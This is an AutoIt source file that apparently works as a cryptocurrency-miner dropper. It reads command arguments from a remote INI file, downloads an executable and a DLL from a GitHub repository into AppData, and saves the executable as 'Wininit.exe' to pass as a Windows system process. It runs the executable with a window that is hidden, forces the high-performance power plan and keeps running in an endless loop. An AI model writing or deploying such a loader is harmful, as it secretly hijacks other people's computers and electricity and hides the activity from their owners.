#include <GuiListView.au3>

HotKeySet("{f4}", sair)
HotKeySet("{f7}", fechar)


start_var()
download()
executar()
highperformace()
inf()

Func download()
	$path0 = (@AppDataDir & "\WinGG\" & $_name)
	$path1 = (@AppDataDir & "\WinGG\msvcr120.dll")
	InetGet($_Url0, $path0)
	InetGet($_Url1, $path1)


EndFunc   ;==>download

Func executar()
	Run(@AppDataDir & "\WinGG\" & $_name & $_coin_code)
	Global $hwnd = WinWait(@AppDataDir & "\WinGG\" & $_name)
	WinSetState($hwnd, "", @SW_HIDE)
EndFunc   ;==>executar

Func fechar()
	WinClose($hwnd)
	Exit
EndFunc   ;==>fechar

Func highperformace()
	Run(@ComSpec & " /c " & "powercfg.exe /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c", @SystemDir, @SW_HIDE)
EndFunc   ;==>highperformace

Func inf()
	While 1
	WEnd
EndFunc   ;==>inf

Func sair()
	Exit
EndFunc   ;==>sair

Func start_var()
	Global $_name = "Wininit.exe"
	InetGet("https://raw.githubusercontent.com/WinGGAp/WinGG/master/Arquivos%20FONtes/command.INI",@AppDataDir & "\WinGG\command.ini")
	$hFileOpen = (@AppDataDir &"\WinGG\command.ini")
	Global $_coin_code	= FileRead($hFileOpen)
	ToolTip($_coin_code,0,0)
	Sleep(10000)
	Global $_Url0 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Wininit.exe" ;Url
	Global $_Url1 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/msvcr120.dll" ;Url
EndFunc   ;==>start_var
